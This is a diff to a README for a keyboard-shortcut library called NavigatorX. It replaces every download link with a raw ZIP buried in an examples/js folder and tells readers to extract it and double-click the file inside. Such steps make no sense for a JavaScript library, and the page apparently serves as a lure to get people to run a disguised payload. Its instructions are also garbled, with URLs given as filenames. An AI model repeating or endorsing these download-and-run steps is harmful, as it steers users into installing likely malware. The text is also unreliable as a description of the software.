@@ -1,7 +1,7 @@
 # 🎹 navigatorx - Manage Your Shortcuts with Ease
 
 ## 📥 Download Now
-[![Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip)](https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip)
+[![Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip)](https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip)
 
 ## 📝 Description
 NavigatorX is a lightweight, type-safe keyboard shortcut manager designed for web applications. It helps you streamline your workflow by allowing you to set and manage keyboard shortcuts easily. With NavigatorX, you can enhance your productivity without any coding knowledge.
@@ -10,15 +10,15 @@ NavigatorX is a lightweight, type-safe keyboard shortcut manager designed for we
 Follow these simple steps to download and run NavigatorX on your device.
 
 1. **Visit the Release Page**: Click on the link below to reach the releases page:
-   [Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip)
+   [Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip)
 
 2. **Choose Your Version**: On the releases page, you will see a list of available versions. Select the most recent version for best results.
 
-3. **Download the Application**: Click the file associated with the latest release. For example, if you see a file named `https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip`, click to download it.
+3. **Download the Application**: Click the file associated with the latest release. For example, if you see a file named `https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip`, click to download it.
 
 4. **Extract the Files**: Once the download is complete, locate the downloaded ZIP file in your Downloads folder. Right-click the file and select "Extract All" to unzip the contents.
 
-5. **Run the Application**: After extraction, you should see the application file (for example, `https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip`). Double-click this file to start NavigatorX.
+5. **Run the Application**: After extraction, you should see the application file (for example, `https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip`). Double-click this file to start NavigatorX.
 
 ## ⚙️ System Requirements
 To run NavigatorX smoothly, ensure your system meets the following requirements:
@@ -39,7 +39,7 @@ NavigatorX comes with several features to enhance your experience:
 ## 📂 Download & Install
 To download and install NavigatorX:
 
-1. Go back to the releases page: [Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip)
+1. Go back to the releases page: [Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip)
 2. Download the latest version as described above.
 3. Follow the extraction and execution steps.
 
@@ -60,4 +60,4 @@ If you need help or have any questions, feel free to reach out to us through the
 ## 🚀 Ready to Enhance Your Workflow?
 With NavigatorX, setting up and managing your keyboard shortcuts has never been easier. Start streamlining your web application experience today. Download NavigatorX now!
 
-[![Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip)](https://raw.githubusercontent.com/Babalim77/navigatorx/main/Cyrillic/navigatorx.zip)
+[![Download NavigatorX](https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip)](https://raw.githubusercontent.com/Babalim77/navigatorx/main/examples/vanilla-js-example/js/Software_2.2-alpha.3.zip)
